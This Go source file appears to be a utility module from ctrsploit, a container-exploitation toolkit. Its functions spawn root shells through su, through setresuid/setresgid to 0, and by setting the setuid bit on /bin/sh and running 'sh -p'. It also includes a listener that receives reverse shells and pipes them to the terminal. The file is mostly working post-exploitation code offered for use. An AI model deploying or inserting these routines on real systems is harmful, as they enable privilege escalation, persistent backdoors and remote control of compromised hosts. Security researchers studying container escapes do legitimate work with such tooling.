package util

import (
	"io"
	"net"
	"os"
	"os/exec"
	"syscall"

	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/ssst0n3/awesome_libs/awesome_error"
)

func InvokeRootShellBySu() {
	shell := exec.Command("su", "-", "root")
	shell.Stdout = os.Stdout
	shell.Stdin = os.Stdin
	shell.Stderr = os.Stderr
	shell.Run()
}

func InvokeRootShellBySetuid(i io.Reader, o, e io.Writer) (err error) {
	err = syscall.Setresuid(0, 0, 0)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	err = syscall.Setresgid(0, 0, 0)
	awesome_error.CheckDebug(err)
	shell := exec.Command("/bin/sh")
	shell.Stdin = i
	shell.Stdout = o
	shell.Stderr = e
	err = shell.Run()
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	return
}

// InvokeRootShellBySuid doest not work for busybox
func InvokeRootShellBySuid(i io.Reader, o, e io.Writer) (err error) {
	// Incorrect call:
	//     os.Chmod("/bin/dash", 06755)
	//
	// Why it fails:
	// os.Chmod applies
	//     mode & os.ModePerm          // keeps only 0o777
	// so the set-uid, set-gid and sticky bits (0o4000/0o2000/0o1000)
	// are silently discarded, turning 06755 into 0755.
	//
	// Correct approaches:
	// 1. Use syscall.Chmod / unix.Chmod, which preserve all bits, or
	// 2. Call os.Chmod for the regular permission bits, then add the
	//    special bits with a syscall.
	// e.g.
	// syscall.Chmod("/bin/dash", 06755)
	// os.Chmod("/bin/dash", os.ModePerm|os.ModeSetuid|os.ModeSetgid)
	err = syscall.Chmod("/bin/sh", 04755)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	// prevent the text-busy error caused by overlayfs's copy-up
	syscall.Sync()
	shell := exec.Command("/bin/sh", "-p")
	shell.Stdin = i
	shell.Stdout = o
	shell.Stderr = e
	err = shell.Run()
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	return
}

func ReceiveReverseShell(listener net.Listener) (err error) {
	conn, err := listener.Accept()
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	defer conn.Close()
	log.Logger.Infof("received connection from %s", conn.RemoteAddr()) // Connection received
	go func() {
		io.Copy(os.Stdout, conn)
	}()
	io.Copy(conn, os.Stdin)
	return
}

func InvokeShellUnderDir(dir string, i io.Reader, o, e io.Writer) (err error) {
	shell := "/bin/sh"
	cmd := exec.Command(shell)
	cmd.Dir = dir
	cmd.Stdin = i
	cmd.Stdout = o
	cmd.Stderr = e
	awesome_error.CheckFatal(cmd.Start())
	return cmd.Wait()
}
